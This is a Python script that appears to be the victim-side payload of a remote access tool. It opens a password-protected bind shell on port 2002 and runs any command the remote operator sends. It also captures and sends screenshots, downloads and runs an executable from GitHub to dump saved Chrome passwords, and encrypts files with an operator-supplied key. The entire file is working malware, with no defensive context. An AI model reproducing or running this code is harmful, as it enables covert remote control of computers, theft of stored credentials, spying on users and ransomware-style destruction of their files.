while True:
    try:
        import socket as s, subprocess as sp, os, pyautogui, tempfile, urllib.request
        from cryptography.fernet import Fernet

        #creatin socket
        BUFFER_SIZE = 1024 * 1280
        s1=s.socket(s.AF_INET,s.SOCK_STREAM)
        s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1)
        s1.bind(("0.0.0.0",2002))
        s1.listen(1)
        c,a=s1.accept()
        #asking for authentication
        c.send((f"auth").encode())
        #if entered password is correct
        if (c.recv(BUFFER_SIZE).decode()) == "open@bind":
            c.send((f"{os.getcwd()}").encode())
            while True: 
                d=c.recv(BUFFER_SIZE).decode()
                #if wanna exit
                if d.lower() == "exit":
                    c.send((f"{os.getcwd()}"+"<sep>"+"exiting...").encode())
                    c.close() 
                    break  
                elif d.split()[0].lower() == "cd":
                    # cd command, change directory
                    try:
                        os.chdir(' '.join(d.split()[1:]))
                        output = " "
                    except FileNotFoundError as e:
                        # if there is an error, set as the output
                        output = "File Not Found"  
                    except:
                        pass      
                elif d.lower() == "screenshot":
                    pyautogui.screenshot().save(f"{tempfile.gettempdir()}\MyScreenshot.png")
                    with open(f"{tempfile.gettempdir()}\MyScreenshot.png", "rb") as image:
                        c.send(image.read())
                    os.remove(f"{tempfile.gettempdir()}\\MyScreenshot.png")    
                    output = "screenshot saved!"  

                elif d.lower() == "chromepass":
                    result = ""
                    if f"{os.name}" == "nt":
                        urllib.request.urlretrieve("https://github.com/sky9262/shellBit/raw/main/other%20scripts/ChromePass/ChromePass.exe", f"{tempfile.gettempdir()}\ChromePass.exe")
                        chromepass = sp.getoutput(f"{tempfile.gettempdir()}\ChromePass.exe")
                        c.send(chromepass.encode())
                        os.remove(f"{tempfile.gettempdir()}\ChromePass.exe")    
                        result = f"saved in \" {os.getcwd()} \""
                    else:
                        c.send("null".encode())
                        result = "It's not a window OS"

                    output = result
                elif d.split()[0].lower() == "encrypt":
                    cwd = os.getcwd()
                    c.send((f"{cwd}"+"<sep>"+"key").encode())
                    key=c.recv(BUFFER_SIZE)
                    try:
                        f = Fernet(key)
                        err_file = 0
                        succ_file = 0
                        for filename in d.split()[1:]:
                            if os.path.exists(filename):
                                with open(filename, "rb") as file:
                                    file_data = file.read()
                                encrypted_data = f.encrypt(file_data)
                                with open(filename, "wb") as file:
                                    file.write(encrypted_data)
                                succ_file += 1
                            else:
                                 err_file += 1     
                        output=f"{succ_file} file encrypted and {err_file} file not exist out of {len(d.split())-1}.\n"   
                    except Exception as err:
                        output = err
                elif d.split()[0].lower() == "decrypt":
                    cwd = os.getcwd()
                    c.send((f"{cwd}"+"<sep>"+"key").encode())
                    key=c.recv(BUFFER_SIZE)
                    try:
                        f = Fernet(key)
                        err_file = 0
                        succ_file = 0
                        for filename in d.split()[1:]:
                            if os.path.exists(filename):
                                with open(filename, "rb") as file:
                                    encrypted_data  = file.read()
                                decrypted_data  = f.decrypt(encrypted_data)
                                with open(filename, "wb") as file:
                                    file.write(decrypted_data)
                                succ_file += 1
                            else:
                                 err_file += 1     
                        output=f"{succ_file} file decrypted and {err_file} file not exist out of {len(d.split())-1}.\n"   
                    except Exception as err:
                        output = err
                else:
                    output = str(sp.getoutput(d))
                cwd = os.getcwd()
                p=f"{cwd}"+"<sep>"+output
                c.send(p.encode())
        #if entered password is not correct        
        else:
            c.send((f"denied").encode())            
        c.close() 
        s1.close()   
    except:
        pass        